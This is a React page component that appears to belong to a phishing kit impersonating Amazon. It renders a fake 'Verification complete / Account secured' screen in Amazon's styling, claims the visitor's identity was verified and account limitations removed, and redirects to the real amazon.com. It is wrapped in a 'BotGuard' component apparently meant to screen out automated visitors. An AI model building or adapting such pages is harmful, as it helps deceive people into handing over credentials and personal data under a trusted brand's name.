import { BotGuard } from '@/components/security/BotGuard';
import { CheckCircle } from 'lucide-react';

/**
 * Completed Page — Verification Success
 *
 * Amazon-styled success card with lucide green check icon.
 */

export default function CompletedPage() {
  return (
    <BotGuard>
      <div className="auth-card">
        <div className="auth-card-inner">
          {/* Amazon Success Alert Box */}
          <div className="alert-box" style={{ backgroundColor: '#F3F9F8', border: '1px solid #067D62', borderLeft: '4px solid #067D62', marginBottom: '22px' }}>
            <div className="alert-icon">
              <CheckCircle size={22} color="#067D62" />
            </div>
            <div className="alert-content">
              <span className="alert-heading" style={{ color: '#067D62' }}>Verification complete</span>
              <span className="alert-message" style={{ color: '#111', textDecoration: 'none', cursor: 'default' }}>
                Your identity has been successfully verified.
              </span>
            </div>
          </div>

          <h1 className="auth-heading">Account secured</h1>

          <p className="page-description" style={{ fontSize: '13px', lineHeight: '19px', marginBottom: '22px' }}>
            Thank you for verifying your identity. Your account has been secured and all limitations have been removed. You can now return to shopping.
          </p>

          <a
            href="https://www.amazon.com"
            className="btn-primary"
            style={{ textDecoration: 'none', display: 'flex', alignItems: 'center', justifyContent: 'center' }}
          >
            Continue
          </a>
        </div>
      </div>
    </BotGuard>
  );
}
